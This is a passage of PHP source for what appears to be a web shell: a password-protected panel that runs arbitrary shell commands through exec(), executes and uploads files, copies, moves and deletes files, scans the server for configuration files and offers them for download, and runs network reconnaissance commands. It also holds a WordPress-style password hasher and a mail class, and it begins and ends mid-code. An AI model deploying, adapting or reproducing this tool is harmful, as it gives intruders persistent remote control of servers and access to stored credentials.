  			 	 <tr><td id="db">Password: </td><td id="db"><input type="Text" name="password" id="dbpassword"></td></tr>
	 	   		 <tr><td id="db"> </td><td id="db"><input type="submit" value="Login" name="submit"></td></tr>
  			 	 
  			 	 </table>
  			 	 </form>
			  </div>
			  <?php 
			  echo "</body></html>";
}
function isLogged()
{
	if(isset($_SESSION['username']) and $_SESSION['username']==='admin' )
		return true;
	return false;
}
function get_client_ip() {
	$ipaddress = '';
	if(isset($_SERVER['REMOTE_ADDR']) )
	{
			
		$ipaddress = $_SERVER['REMOTE_ADDR'];
			
			
	}
	else if (isset($_SERVER['HTTP_CLIENT_IP']))
		$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else if(isset($_SERVER['HTTP_X_FORWARDED']))
		$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	else if(isset($_SERVER['HTTP_FORWARDED_FOR']) )
		$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	else if(isset($_SERVER['HTTP_FORWARDED']))
		$ipaddress = $_SERVER['HTTP_FORWARDED'];


	if (strpos($ipaddress, ',') !== false) {
		$ips = explode(',', $ipaddress);
		$ipaddress = trim($ips[0]);
	}
	if ($ipaddress == '::1')
		$ipaddress = 'localhost';
	return $ipaddress;
}
function getServerURL() {
	$url = (isset($_SERVER["HTTPS"]) and $_SERVER["HTTPS"] == "on")?"https://":"http://";
	$url .= isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:""; // $_SERVER["HTTP_HOST"] is equivalent
	if (isset($_SERVER["SERVER_PORT"]) and $_SERVER["SERVER_PORT"] != "80") $url .= ":".$_SERVER["SERVER_PORT"];
	
	return $url;
}
function getCompleteURL() {
	return getServerURL().(isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:"");
}

function total_delete($arg) {
	if (file_exists($arg)) {
		@chmod($arg,0755);
		if (is_dir($arg)) {
			$handle = opendir($arg);
			while($aux = readdir($handle)) {
				if ($aux != "." && $aux != "..") total_delete($arg."/".$aux);
			}
			@closedir($handle);
			rmdir($arg);
		} else unlink($arg);
	}
}

function total_copy($orig,$dest) {
	$ok = true;
	if (file_exists($orig)) {
		if (is_dir($orig)) {
			mkdir($dest,0755);
			$handle = opendir($orig);
			while(($aux = readdir($handle))&&($ok)) {
				if ($aux != "." && $aux != "..") $ok = total_copy($orig."/".$aux,$dest."/".$aux);
			}
			@closedir($handle);
		} else $ok = copy((string)$orig,(string)$dest);
	}
	return $ok;
}
function total_move($orig,$dest) {
	// Just why doesn't it has a MOVE alias?!
	return rename((string)$orig,(string)$dest);
}
function download(){
	global $current_dir,$filename;
	$file = $filename;
	if(file_exists($file)){
		$is_denied = false;
		/* foreach($download_ext_filter as $key=>$ext){
			if (eregi($ext,$filename)){
				$is_denied = true;
				break;
			}
		} */
		if (!$is_denied){
			$size = filesize($file);
			header("Content-Type: application/save");
			header("Content-Length: $size");
			header("Content-Disposition: attachment; filename=\"$filename\"");
			header("Content-Transfer-Encoding: binary");
			if ($fh = fopen("$file", "rb")){
				fpassthru($fh);
				fclose($fh);
			} else alert(et('ReadDenied').": ".$file);
		} else alert(et('ReadDenied').": ".$file);
	} else echo 'FileNotFound';
}
function execute_cmd(){
	global $cmd;

	//header("Content-type: text/plain");
	$output="";
	if(isset($_SESSION['current_dir']))
		chdir($_SESSION['current_dir']);
	if (strlen($cmd)){
		echo "\n\n# ".$cmd."\n";
		if(strpos($cmd, "cd ")===0)
		{
			$cmd = str_replace("cd ", "", $cmd);
			//echo "present directory: " . getcwd() . "\n" . $cmd . "\n";
			chdir($cmd);
			$_SESSION['current_dir']=format_path(getcwd());
			return getcwd();
		}
		if(preg_match("/.:/",$cmd)===1)
		{
			chdir($cmd);
			$_SESSION['current_dir']=format_path(getcwd());
			return getcwd();
		}
		if(strpos($cmd, "pwd")===0)
		{
			return getcwd() . "\n";
		}
		exec($cmd,$mat,$rtrn);
		$_SESSION['current_dir']=format_path(getcwd());
		echo $_SESSION['current_dir'];
		if (count($mat))
		//$output.= trim(implode("\n<br/>",$mat));
		{
			//echo "inside count";
			//$output.= html_encode( implode("\n",$mat));
			$output.=  implode("\n",$mat);
		}

		else
			$output.= "";
	} else
		$output.="NoCmd";
	return $output;
}


function execute_file(){
	global $current_dir,$filename;
	header("Content-type: text/plain");
	$file = $current_dir.$filename;
	if(file_exists($file)){
		echo "# ".$file."\n";
		exec($file,$mat);
		if (count($mat)) echo trim(implode("\n",$mat));
	} else alert(et('FileNotFound').": ".$file);
}
function save_upload($temp_file,$filename,$dir_dest) {
	global $upload_ext_filter;
	$filename = remove_special_chars($filename);
	$file = $dir_dest.$filename;
	$filesize = filesize($temp_file);
	$is_denied = false;

	if (!$is_denied){
		if (!check_limit($filesize)){
			if (file_exists($file)){
				if (unlink($file)){
					if (copy($temp_file,$file)){
						@chmod($file,0755);
						$out = 6;
					} else $out = 2;
				} else $out = 5;
			} else {
				if (copy($temp_file,$file)){
					@chmod($file,0755);
					$out = 1;
				} else $out = 2;
			}
		} else $out = 3;
	} else $out = 4;
	return $out;
}
function zip_extract(){ 	// extract $cmd_arg="test.zip";
	global $cmd_arg,$current_dir,$islinux;
	$zip = zip_open($current_dir.$cmd_arg);
	//echo $current_dir.$cmd_arg;
	if ($zip) {
			
		while ($zip_entry = zip_read($zip)) {
			if (zip_entry_filesize($zip_entry)) {
				$complete_path = $path.dirname(zip_entry_name($zip_entry));
				$complete_name = $path.zip_entry_name($zip_entry);
				if(!file_exists($complete_path)) {
					$tmp = '';
					foreach(explode('/',$complete_path) AS $k) {
						$tmp .= $k.'/';
						if(!file_exists($tmp)) {
							@mkdir($current_dir.$tmp, 0755);
						}
					}
				}
				if (zip_entry_open($zip, $zip_entry, "r")) {
					if ($fd = fopen($current_dir.$complete_name, 'w')){
						fwrite($fd, zip_entry_read($zip_entry, zip_entry_filesize($zip_entry)));
						fclose($fd);
					} else echo "fopen($current_dir.$complete_name) error<br>";
					zip_entry_close($zip_entry);
				} else echo "zip_entry_open($zip,$zip_entry) error<br>";
			}
		}
		zip_close($zip);
	}
}
// +--------------------------------------------------
// | Data Formating
// +--------------------------------------------------
function html_encode($str){
	global $charSet;
	$str = preg_replace(array('/&/', '/</', '/>/', '/"/'), array('&amp;', '&lt;', '&gt;', '&quot;'), $str);  // Bypass PHP to allow any charset!!
	$str = htmlentities($str, ENT_QUOTES, $charSet, false);
	return $str;
}
//echo rep(5,3); 33333
function rep($x,$y){
	if ($x) {
		$aux = "";
		for ($a=1;$a<=$x;$a++) $aux .= $y;
		return $aux;
	} else return "";
}
//echo str_zero("123123","2");
function str_zero($arg1,$arg2){
	if (strstr($arg1,"-") == false){
		$aux = intval($arg2) - strlen($arg1);
		if ($aux)
			return rep($aux,"0").$arg1;
		else
			return $arg1;
	} else {
		return "[$arg1]";
	}
}
//echo replace_double("123", "123123"); 123
function replace_double($sub,$str){
	$out=str_replace($sub.$sub,$sub,$str);
	while ( strlen($out) != strlen($str) ){
		$str=$out;
		$out=str_replace($sub.$sub,$sub,$str);
	}
	return $out;
}
//echo remove_special_chars("test�������444"); testAAAAAAC444
function remove_special_chars($str){
	$str = trim($str);
	$str = strtr($str,"��������������������������������������������������������������!@#%&*()[]{}+=?",
			"YuAAAAAAACEEEEIIIIDNOOOOOOUUUUYsaaaaaaaceeeeiiiionoooooouuuuyy_______________");
	$str = str_replace("..","",str_replace("/","",str_replace("\\","",str_replace("\$","",$str))));
	return $str;
}
//echo format_path("c:\\test\\test.php"); C:/test/test.php/
function format_path($str){
	global $islinux;
	$str = trim($str);
	$str = str_replace("..","",str_replace("\\","/",str_replace("\$","",$str)));
	$done = false;
	while (!$done) {
		$str2 = str_replace("//","/",$str);
		if (strlen($str) == strlen($str2)) $done = true;
		else $str = $str2;
	}
	$tam = strlen($str);
	if ($tam){
		$last_char = $tam - 1;
		if ($str[$last_char] != "/") $str .= "/";
		if (!$islinux) $str = ucfirst($str);
	}
	return $str;
}

function array_csort() {
	$args = func_get_args();
	$marray = array_shift($args);
	$msortline = "return(array_multisort(";
	foreach ($args as $arg) {
		$i++;
		if (is_string($arg)) {
			foreach ($marray as $row) {
				$sortarr[$i][] = $row[$arg];
			}
		} else {
			$sortarr[$i] = $arg;
		}
		$msortline .= "\$sortarr[".$i."],";
	}
	$msortline .= "\$marray));";
	eval($msortline);
	return $marray;
}
//echo show_perms(octdec("2755")); urwxr
function show_perms( $P ) {
	$sP = "";
	if($P & 0x1000) $sP .= 'p';            // FIFO pipe
	elseif($P & 0x2000) $sP .= 'c';        // Character special
	elseif($P & 0x4000) $sP .= 'd';        // Directory
	elseif($P & 0x6000) $sP .= 'b';        // Block special
	elseif($P & 0x8000) $sP .= '&minus;';  // Regular
	elseif($P & 0xA000) $sP .= 'l';        // Symbolic Link
	elseif($P & 0xC000) $sP .= 's';        // Socket
	else $sP .= 'u';                       // UNKNOWN
	// owner - group - others
	$sP .= (($P & 0x0100) ? 'r' : '&minus;') . (($P & 0x0080) ? 'w' : '&minus;') . (($P & 0x0040) ? (($P & 0x0800) ? 's' : 'x' ) : (($P & 0x0800) ? 'S' : '&minus;'));
	$sP .= (($P & 0x0020) ? 'r' : '&minus;') . (($P & 0x0010) ? 'w' : '&minus;') . (($P & 0x0008) ? (($P & 0x0400) ? 's' : 'x' ) : (($P & 0x0400) ? 'S' : '&minus;'));
	$sP .= (($P & 0x0004) ? 'r' : '&minus;') . (($P & 0x0002) ? 'w' : '&minus;') . (($P & 0x0001) ? (($P & 0x0200) ? 't' : 'x' ) : (($P & 0x0200) ? 'T' : '&minus;'));
	return $sP;
}
//echo format_size(100000000); 95.37 Mb
function format_size($arg) {
	if ($arg>0){
		$j = 0;
		$ext = array(" bytes"," Kb"," Mb"," Gb"," Tb");
		while ($arg >= pow(1024,$j)) ++$j;
		return round($arg / pow(1024,$j-1) * 100) / 100 . $ext[$j-1];
	} else return "0 bytes";
}
//	echo get_size("test.zip"); 3.82 Kb
function get_size($file) {
	return format_size(filesize($file));
}
function check_limit($new_filesize=0) {
	global $fm_current_root;
	global $quota_mb;
	if($quota_mb){
		$total = total_size($fm_current_root);
		if (floor(($total+$new_filesize)/(1024*1024)) > $quota_mb) return true;
	}
	return false;
}

function get_user($arg) {
	global $mat_passwd;
	$aux = "x:".trim($arg).":";
	for($x=0;$x<count($mat_passwd);$x++){
		if (strstr($mat_passwd[$x],$aux)){
			$mat = explode(":",$mat_passwd[$x]);
			return $mat[0];
		}
	}
	return $arg;
}
function get_group($arg) {
	global $mat_group;
	$aux = "x:".trim($arg).":";
	for($x=0;$x<count($mat_group);$x++){
		if (strstr($mat_group[$x],$aux)){
			$mat = explode(":",$mat_group[$x]);
			return $mat[0];
		}
	}
	return $arg;
}
//echo uppercase("test"); TEST
function uppercase($str){
	global $charset;
	return mb_strtoupper($str, $charset);
}
//echo lowercase("tESt"); test
function lowercase($str){
	global $charset;
	return mb_strtolower($str, $charset);
}
function n()
{
	return "<br>";
}
function banner()
{
	global $ip;
	echo "[ System : ".php_uname() . "] <br>";
	echo "[ Server : " . $_SERVER['SERVER_SOFTWARE'] ."] <br>" ;
	
	// Check for safe mode
	if( ini_get('safe_mode') ){
		echo ' [Safe mode = on] ' ;
	}else{
		echo ' [Safe mode = off (unsafe)] ';
	}
	echo " [ User: " . get_current_user() ." ] ";
	echo " [Server: " . (isset($_SERVER["SERVER_NAME"])?$_SERVER["SERVER_NAME"]:"") . "] ";
	echo " [Client: ". $ip ."]";
	//print_r($_SERVER);
	//print_r($_SERVER);
}
function compressFolder($rootPath)
{
	chdir($_SESSION['current_dir']);
//	$rootPath = realpath();
	if($rootPath[strlen($rootPath)-1] === '/' or $rootPath[strlen($rootPath)-1] === '\\')
		$rootPath = substr($rootPath,0,strlen($rootPath)-1);
	//echo $rootPath;
	// Initialize archive object
	
	$zip = new ZipArchive();
	$zip->open($rootPath.".zip", ZipArchive::CREATE | ZipArchive::OVERWRITE);
	
	// Create recursive directory iterator
	/** @var SplFileInfo[] $files */
	$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( $rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
	);
	
	foreach ($files as $name => $file)
	{
		// Skip directories (they would be added automatically)
		if (!$file->isDir())
		{
			// Get real and relative path for current file
			$filePath = $file->getRealPath();
			$relativePath = substr($filePath, strlen($rootPath) + 1);
	
			// Add current file to archive
			//$zip->addFile($filePath, $relativePath);
			$zip->addFile($filePath, $name);
				
		}
	}
	
	// Zip archive will be created only after closing object
	$zip->close();
	return $rootPath.".zip";
}
function compressFileFolder($files)
{
	chdir($_SESSION['current_dir']);
	// = array('New folder (3)', '404 shell.php', 'asim.html');
	$zipname = 'downloadCompressed.zip';
	$zip = new ZipArchive;
	$zip->open($zipname, ZipArchive::CREATE | ZipArchive::OVERWRITE);
	
	foreach ($files as $file) {
		if(!is_dir($file))
		{
			$zip->addFile($file);
		}
		else 
		{
			$rootPath=$file;
			$FolderFiles = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $rootPath),
					RecursiveIteratorIterator::LEAVES_ONLY
			);
			
			foreach ($FolderFiles as $name => $FolderFile)
			{
				// Skip directories (they would be added automatically)
				if (!$FolderFile->isDir())
				{
					// Get real and relative path for current file
					$filePath = $FolderFile->getRealPath();
					//$relativePath = substr($filePath, strlen($rootPath) + 1);
			
					// Add current file to archive
					//$zip->addFile($filePath, $relativePath);
					$zip->addFile($filePath, $rootPath.'\\'.$name);
			
				}
			}
		}
	}
	$zip->close();
	return $zipname;
}
function displayChangePassword()
{
	global $rpath;
	?>
	<div class="bodyDiv">
	<form method="post" >
	<table id='db' >
	<tr><td >Old Username:</td>
	<td id="db"> <input type="Text" name="oldusername" id="dbusername"></td></tr>
	<tr><td >Old Password: </td><td id="db">
	<input type="Text" name="oldpassword" id="dbpassword"></td></tr>
	
	<tr><td >New Username:</td><td id="db"> 
	<input type="Text" name="newusername" id="dbusername"></td></tr>
	<tr><td >New Password: </td><td id="db">
	<input type="Text" name="newpassword" id="dbpassword"></td></tr>
	<tr><td > </td><td ><input type="submit"  value="Chang Password" name="submit"></td></tr>
	
	</table>
	</form>
	</div>
	<?php 
}
function processChangePassword()
{
	
	global $oldusername,$oldpassword,$newusername,$newpassword;
	
	
	$pattern1 = "/\\\$u = \"".$oldusername."\";/";
	$pattern2 = "/\\\$p = \"".md5($oldpassword)."\";/";
	$pattern3 = "\$u = \"".$newusername."\";";
	$pattern4 = "\$p = \"".md5($newpassword)."\";";
	$data = file_get_contents($_SERVER['SCRIPT_FILENAME']);
	
	if(preg_match($pattern1,$data)===1 and preg_match($pattern2,$data)===1)
	{
		//$pattern1 = "if(\$username===\"".$newusername."\" and md5(\$password)==='".md5($newpassword)."')";
		
		$result1 = preg_replace($pattern1,$pattern3,$data);
		$result2 = preg_replace($pattern2,$pattern4,$result1);
		file_put_contents($_SERVER['SCRIPT_FILENAME'],$result2);
		echo "<div class='bodydiv'>Username and Password Changed Successfully</div>";
	}
	
	else 
		echo "<div class='bodydiv'>Wrong Username:Password</div>";
}
function displayHeaders()
{
	echo "<div class='bodydiv'>";
	foreach (getallheaders() as $name => $value) {
		echo "$name: $value<br>";
	}
	echo "</div>";
}
function findConfig()
{
	global $rpath;
	chdir($_SESSION['current_dir']);
	$filenames = array("config.php","conf_global.php","Settings.php",
			"configuration.php","settings.php","configure.php"
	);

	// Create recursive directory iterator
	/** @var SplFileInfo[] $files */
	$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator( getcwd()),
			RecursiveIteratorIterator::LEAVES_ONLY
	);

	foreach ($files as $name => $file)
	{
		$filePath = $file->getRealPath();
		foreach ($filenames as $filename)
		{
			if (!$file->isDir() and strpos($name,$filename)!==false)
			{
				echo "<a href='{$rpath}?vf={$filePath}&dlfile=1'>".$filePath . "</a><br>";
			}
		}
	}
	echo "<br>----------------------More Config Found-------------------<br>";
	
	foreach ($files as $name => $file)
	{
		$filePath = $file->getRealPath();
		if (!$file->isDir() and strpos($name,"config")!==false)
		{
			echo "<a href='{$rpath}?vf={$filePath}&dlfile=1'>".$filePath . "</a><br>";
		}
	}
}
function displayCommands()
{
	global $rpath,$islinux;
	?>
	<div class='bodydiv'>
	<div id="menu">
	<a class="menu" href="<?php echo $rpath?>?command=1">Netstat</a>
	<a class="menu" href="<?php echo $rpath?>?command=2">Ipconfig</a>
	<a class="menu" href="<?php echo $rpath?>?command=3">Route</a>
	</div><pre>
	<textarea rows="25" readonly>
	<?php 
	if(isset($_SESSION['command']))
	{
		if($_SESSION['command']==1)
		{
			if($islinux)
			{
				exec("netstat -ntulp",$mat,$rtrn);
			}
			else{
				exec("netstat -ano",$mat,$rtrn);
			}
			echo implode("\n",$mat);;
		}
		else if($_SESSION['command']==2)
		{
			if($islinux)
			{
				exec("ifconfig",$mat,$rtrn);
			}
			else{
				exec("ipconfig /all",$mat,$rtrn);
			}
			echo implode("\n",$mat);;
		}
		else if($_SESSION['command']==3)
		{
			if($islinux)
			{
				exec("route",$mat,$rtrn);
			}
			else{
				exec("route print -4",$mat,$rtrn);
			}
			echo implode("\n",$mat);;
		}
		
	}
	echo "</textarea></pre></div>";
}
function displayHash()
{
	global $rpath,$hpass,$hsalt;
	if(!isset($hpass))
	{
		$hpass="admin";
	}
	?>
	<div class="bodyDiv">
	<form method="post" >
	Password: <input name='hpass' > Salt: <input name='hsalt' > <input type='submit' value='hash'>
	</form>
	</div>
	<?php 
	echo "<div class='bodyDiv'>";
	echo "Password : ".$hpass."<br>";
	echo "MD5 : " . md5($hpass) . "<br>";
	$wp_hasher = new PasswordHash(8, TRUE);
	echo "Wordpress : " . $wp_hasher->HashPassword('123') . "<br>";
	echo "<div>";
}
class PasswordHash {
	var $itoa64;
	var $iteration_count_log2;
	var $portable_hashes;
	var $random_state;

	function PasswordHash($iteration_count_log2, $portable_hashes)
	{
		$this->itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';

		if ($iteration_count_log2 < 4 || $iteration_count_log2 > 31)
			$iteration_count_log2 = 8;
		$this->iteration_count_log2 = $iteration_count_log2;

		$this->portable_hashes = $portable_hashes;

		$this->random_state = microtime() . uniqid(rand(), TRUE); // removed getmypid() for compatibility reasons
	}

	function get_random_bytes($count)
	{
		$output = '';
		if ( @is_readable('/dev/urandom') &&
				($fh = @fopen('/dev/urandom', 'rb'))) {
					$output = fread($fh, $count);
					fclose($fh);
				}

				if (strlen($output) < $count) {
					$output = '';
					for ($i = 0; $i < $count; $i += 16) {
						$this->random_state =
						md5(microtime() . $this->random_state);
						$output .=
						pack('H*', md5($this->random_state));
					}
					$output = substr($output, 0, $count);
				}

				return $output;
	}

	function encode64($input, $count)
	{
		$output = '';
		$i = 0;
		do {
			$value = ord($input[$i++]);
			$output .= $this->itoa64[$value & 0x3f];
			if ($i < $count)
				$value |= ord($input[$i]) << 8;
			$output .= $this->itoa64[($value >> 6) & 0x3f];
			if ($i++ >= $count)
				break;
			if ($i < $count)
				$value |= ord($input[$i]) << 16;
			$output .= $this->itoa64[($value >> 12) & 0x3f];
			if ($i++ >= $count)
				break;
			$output .= $this->itoa64[($value >> 18) & 0x3f];
		} while ($i < $count);

		return $output;
	}

	function gensalt_private($input)
	{
		$output = '$P$';
		$output .= $this->itoa64[min($this->iteration_count_log2 +
				((PHP_VERSION >= '5') ? 5 : 3), 30)];
		$output .= $this->encode64($input, 6);

		return $output;
	}

	function crypt_private($password, $setting)
	{
		$output = '*0';
		if (substr($setting, 0, 2) == $output)
			$output = '*1';

		$id = substr($setting, 0, 3);
		# We use "$P$", phpBB3 uses "$H$" for the same thing
		if ($id != '$P$' && $id != '$H$')
			return $output;

			$count_log2 = strpos($this->itoa64, $setting[3]);
			if ($count_log2 < 7 || $count_log2 > 30)
				return $output;

			$count = 1 << $count_log2;

			$salt = substr($setting, 4, 8);
			if (strlen($salt) != 8)
				return $output;

			# We're kind of forced to use MD5 here since it's the only
			# cryptographic primitive available in all versions of PHP
			# currently in use.  To implement our own low-level crypto
			# in PHP would result in much worse performance and
			# consequently in lower iteration counts and hashes that are
			# quicker to crack (by non-PHP code).
			if (PHP_VERSION >= '5') {
				$hash = md5($salt . $password, TRUE);
				do {
					$hash = md5($hash . $password, TRUE);
				} while (--$count);
			} else {
				$hash = pack('H*', md5($salt . $password));
				do {
					$hash = pack('H*', md5($hash . $password));
				} while (--$count);
			}

			$output = substr($setting, 0, 12);
			$output .= $this->encode64($hash, 16);

			return $output;
	}

	function gensalt_extended($input)
	{
		$count_log2 = min($this->iteration_count_log2 + 8, 24);
		# This should be odd to not reveal weak DES keys, and the
		# maximum valid value is (2**24 - 1) which is odd anyway.
		$count = (1 << $count_log2) - 1;

		$output = '_';
		$output .= $this->itoa64[$count & 0x3f];
		$output .= $this->itoa64[($count >> 6) & 0x3f];
		$output .= $this->itoa64[($count >> 12) & 0x3f];
		$output .= $this->itoa64[($count >> 18) & 0x3f];

		$output .= $this->encode64($input, 3);

		return $output;
	}

	function gensalt_blowfish($input)
	{
		# This one needs to use a different order of characters and a
		# different encoding scheme from the one in encode64() above.
		# We care because the last character in our encoded string will
		# only represent 2 bits.  While two known implementations of
		# bcrypt will happily accept and correct a salt string which
		# has the 4 unused bits set to non-zero, we do not want to take
		# chances and we also do not want to waste an additional byte
		# of entropy.
		$itoa64 = './ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

		$output = '$2a$';
		$output .= chr(ord('0') + $this->iteration_count_log2 / 10);
		$output .= chr(ord('0') + $this->iteration_count_log2 % 10);
		$output .= '$';

		$i = 0;
		do {
			$c1 = ord($input[$i++]);
			$output .= $itoa64[$c1 >> 2];
			$c1 = ($c1 & 0x03) << 4;
			if ($i >= 16) {
				$output .= $itoa64[$c1];
				break;
			}

			$c2 = ord($input[$i++]);
			$c1 |= $c2 >> 4;
			$output .= $itoa64[$c1];
			$c1 = ($c2 & 0x0f) << 2;

			$c2 = ord($input[$i++]);
			$c1 |= $c2 >> 6;
			$output .= $itoa64[$c1];
			$output .= $itoa64[$c2 & 0x3f];
		} while (1);

		return $output;
	}

	function HashPassword($password)
	{
		if ( strlen( $password ) > 4096 ) {
			return '*';
		}

		$random = '';

		if (CRYPT_BLOWFISH == 1 && !$this->portable_hashes) {
			$random = $this->get_random_bytes(16);
			$hash =
			crypt($password, $this->gensalt_blowfish($random));
			if (strlen($hash) == 60)
				return $hash;
		}

		if (CRYPT_EXT_DES == 1 && !$this->portable_hashes) {
			if (strlen($random) < 3)
				$random = $this->get_random_bytes(3);
			$hash =
			crypt($password, $this->gensalt_extended($random));
			if (strlen($hash) == 20)
				return $hash;
		}

		if (strlen($random) < 6)
			$random = $this->get_random_bytes(6);
		$hash =
		$this->crypt_private($password,
				$this->gensalt_private($random));
		if (strlen($hash) == 34)
			return $hash;

		# Returning '*' on error is safe here, but would _not_ be safe
		# in a crypt(3)-like function used _both_ for generating new
		# hashes and for validating passwords against existing hashes.
		return '*';
	}

	function CheckPassword($password, $stored_hash)
	{
		if ( strlen( $password ) > 4096 ) {
			return false;
		}

		$hash = $this->crypt_private($password, $stored_hash);
		if ($hash[0] == '*')
			$hash = crypt($password, $stored_hash);

		return $hash === $stored_hash;
	}
}
class SimpleMail
{
	protected $_wrap = 78;
	protected $_to = array();
	protected $_subject;
	protected $_message;
	protected $_headers = array();
	protected $_params;
	protected $_attachments = array();
	protected $_uid;
	public function __construct()
	{
		$this->reset();
	}
	public function reset()
	{
		$this->_to = array();
		$this->_headers = array();
		$this->_subject = null;
		$this->_message = null;
		$this->_wrap = 78;
		$this->_params = null;
		$this->_attachments = array();
		$this->_uid = $this->getUniqueId();
		return $this;
	}
	public function setTo($email, $name)
	{
		$this->_to[] = $this->formatHeader((string) $email, (string) $name);
		return $this;
	}
	public function getTo()
	{
		return $this->_to;
	}
	public function setSubject($subject)
	{
		$this->_subject = $this->encodeUtf8(
				$this->filterOther((string) $subject)
		);
		return $this;
	}
	public function getSubject()
	{
		return $this->_subject;
	}
	public function setMessage($message)
	{
		$this->_message = str_replace("\n.", "\n..", (string) $message);
		return $this;
	}
	public function getMessage()
	{
		return $this->_message;
	}
	public function addAttachment($path, $filename = null)
	{
		$filename = empty($filename) ? basename($path) : $filename;
		$this->_attachments[] = array(
				'path' => $path,
				'file' => $filename,
				'data' => $this->getAttachmentData($path)
		);
		return $this;
	}
	public function getAttachmentData($path)
	{
		$filesize = filesize($path);
		$handle = fopen($path, "r");
		$attachment = fread($handle, $filesize);
		fclose($handle);
		return chunk_split(base64_encode($attachment));
	}
	public function setFrom($email, $name)
	{
		$this->addMailHeader('From', (string) $email, (string) $name);
		return $this;
	}
	public function addMailHeader($header, $email = null, $name = null)
	{
		$address = $this->formatHeader((string) $email, (string) $name);
		$this->_headers[] = sprintf('%s: %s', (string) $header, $address);
		return $this;
	}
	public function addGenericHeader($header, $value)
	{
		$this->_headers[] = sprintf(
				'%s: %s',
				(string) $header,
				(string) $value
		);
		return $this;
	}
	public function getHeaders()
	{
		return $this->_headers;
	}
	public function setParameters($additionalParameters)
	{
		$this->_params = (string) $additionalParameters;
		return $this;
	}
	public function getParameters()
	{
		return $this->_params;
	}
	public function setWrap($wrap = 78)
	{
		$wrap = (int) $wrap;
		if ($wrap < 1) {
			$wrap = 78;
		}
		$this->_wrap = $wrap;
		return $this;
	}
	public function getWrap()
	{
		return $this->_wrap;
	}
	public function hasAttachments()
	{
		return !empty($this->_attachments);
	}
	public function assembleAttachmentHeaders()
	{
		$head = array();
		$head[] = "MIME-Version: 1.0";
		$head[] = "Content-Type: multipart/mixed; boundary=\"{$this->_uid}\"";
		return join(PHP_EOL, $head);
	}
	public function assembleAttachmentBody()
	{
		$body = array();
		$body[] = "This is a multi-part message in MIME format.";
		$body[] = "--{$this->_uid}";
		$body[] = "Content-type:text/html; charset=\"utf-8\"";
		$body[] = "Content-Transfer-Encoding: 7bit";
		$body[] = "";
		$body[] = $this->_message;
		$body[] = "";
		$body[] = "--{$this->_uid}";
		foreach ($this->_attachments as $attachment) {
			$body[] = $this->getAttachmentMimeTemplate($attachment);
		}
		return implode(PHP_EOL, $body);
	}
	public function getAttachmentMimeTemplate($attachment)
	{
		$file = $attachment['file'];
		$data = $attachment['data'];
		$head = array();
		$head[] = "Content-Type: application/octet-stream; name=\"{$file}\"";
		$head[] = "Content-Transfer-Encoding: base64";
		$head[] = "Content-Disposition: attachment; filename=\"{$file}\"";
		$head[] = "";
		$head[] = $data;
		$head[] = "";
		$head[] = "--{$this->_uid}";
		return implode(PHP_EOL, $head);
	}
	public function send()
	{
		$to = $this->getToForSend();
		$headers = $this->getHeadersForSend();
		if (empty($to)) {
			throw new RuntimeException(
					'Unable to send, no To address has been set.'
			);
		}
		if ($this->hasAttachments()) {
			$message  = $this->assembleAttachmentBody();
			$headers .= PHP_EOL . $this->assembleAttachmentHeaders();
		} else {
			$message = $this->getWrapMessage();
		}
		return mail($to, $this->_subject, $message, $headers, $this->_params);
	}
	public function debug()
	{
		return '<pre>' . print_r($this, true) . '</pre>';
	}
	public function __toString()
	{
		return print_r($this, true);
	}
	public function formatHeader($email, $name = null)
	{
		$email = $this->filterEmail($email);
		if (empty($name)) {
			return $email;
		}
		$name = $this->encodeUtf8($this->filterName($name));
		return sprintf('"%s" <%s>', $name, $email);
	}
	public function encodeUtf8($value)
	{
		$value = trim($value);
		if (preg_match('/(\s)/', $value)) {
			return $this->encodeUtf8Words($value);
		}
		return $this->encodeUtf8Word($value);
	}
	public function encodeUtf8Word($value)
	{
		return sprintf('=?UTF-8?B?%s?=', base64_encode($value));
	}
	public function encodeUtf8Words($value)
	{
		$words = explode(' ', $value);
		$encoded = array();
		foreach ($words as $word) {
			$encoded[] = $this->encodeUtf8Word($word);
		}
		return join($this->encodeUtf8Word(' '), $encoded);
	}
	public function filterEmail($email)
	{
		$rule = array(
				"\r" => '',
				"\n" => '',
				"\t" => '',
				'"'  => '',
				','  => '',
				'<'  => '',
				'>'  => ''
		);
		$email = strtr($email, $rule);
		$email = filter_var($email, FILTER_SANITIZE_EMAIL);
		return $email;
	}
	public function filterName($name)
	{
		$rule = array(
				"\r" => '',
				"\n" => '',
				"\t" => '',
				'"'  => "'",
				'<'  => '[',
				'>'  => ']',
		);
		$filtered = filter_var(
				$name,
				FILTER_SANITIZE_STRING,
				FILTER_FLAG_NO_ENCODE_QUOTES
		);
		return trim(strtr($filtered, $rule));
	}
	public function filterOther($data)
	{
		return filter_var($data, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW);
	}
	public function getHeadersForSend()
	{
		if (empty($this->_headers)) {
			return '';
		}
		return join(PHP_EOL, $this->_headers);
	}
	public function getToForSend()
	{
		if (empty($this->_to)) {
			return '';
		}
		return join(', ', $this->_to);
	}
	public function getUniqueId()
	{
		return md5(uniqid(time()));
	}
	public function getWrapMessage()
	{
		return wordwrap($this->_message, $this->_wrap);
	}
}
function processPaste()
{
	global $islinux;
	if( isset($_SESSION['lastAction']) and $_SESSION['lastAction']=='Copy')
	{
		foreach ($_SESSION['Copy'] as $item)
		{
			if($islinux)
			{
				total_copy($_SESSION['CopyPath'] . "/" . $item ,$_SESSION['current_dir'] . "/" . $item);
			}
			else 
				total_copy($_SESSION['CopyPath'] . "\\" . $item ,$_SESSION['current_dir'] . "\\" . $item);
		}
		$_SESSION['lastAction']="";
		
	}
	else if( isset($_SESSION['lastAction']) and $_SESSION['lastAction']=='Cut')
	{
		foreach ($_SESSION['Cut'] as $item)
		{
			if($islinux)
			{
